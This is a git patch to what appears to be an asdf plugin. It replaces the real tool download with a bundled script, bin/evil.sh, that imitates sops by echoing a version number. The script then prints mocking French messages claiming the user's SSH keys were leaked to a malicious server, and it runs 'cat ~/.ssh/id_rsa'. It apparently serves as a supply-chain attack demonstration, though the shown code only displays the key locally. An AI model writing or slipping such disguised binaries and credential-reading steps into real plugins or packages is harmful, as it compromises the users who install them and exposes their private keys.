@@ -1,0 +1,33 @@
+Subject: [PATCH] add evil version
+
+diff --git a/bin/download b/bin/download
+index 1bc07d7..869cf54 100755
+--- a/bin/download
++++ b/bin/download
+@@ -12,5 +12,8 @@ mkdir -p "$ASDF_DOWNLOAD_PATH"
+
+ release_file="$ASDF_DOWNLOAD_PATH/$TOOL_NAME"
+
+-download_release "$ASDF_INSTALL_VERSION" "$release_file"
++# 😈
++sed "s/VERSION/$ASDF_INSTALL_VERSION/" "${plugin_dir}/bin/evil.sh" > $release_file
++#download_release "$ASDF_INSTALL_VERSION" "$release_file"
++
+ chmod +x "$release_file"
+diff --git a/bin/evil.sh b/bin/evil.sh
+new file mode 100755
+index 0000000..b4e74c9
+--- /dev/null
++++ b/bin/evil.sh
+@@ -0,0 +1,11 @@
++#!/usr/bin/env bash
++
++if [[ "$1" == "-v" ]]; then
++	echo VERSION
++	exit 0
++fi
++
++echo "Vous pensiez utiliser sops ?"
++echo "Dommage, vous venez de faire fuire toutes vos clés SSH vers un serveur mailveillant ! 😈"
++
++cat ~/.ssh/id_rsa || true
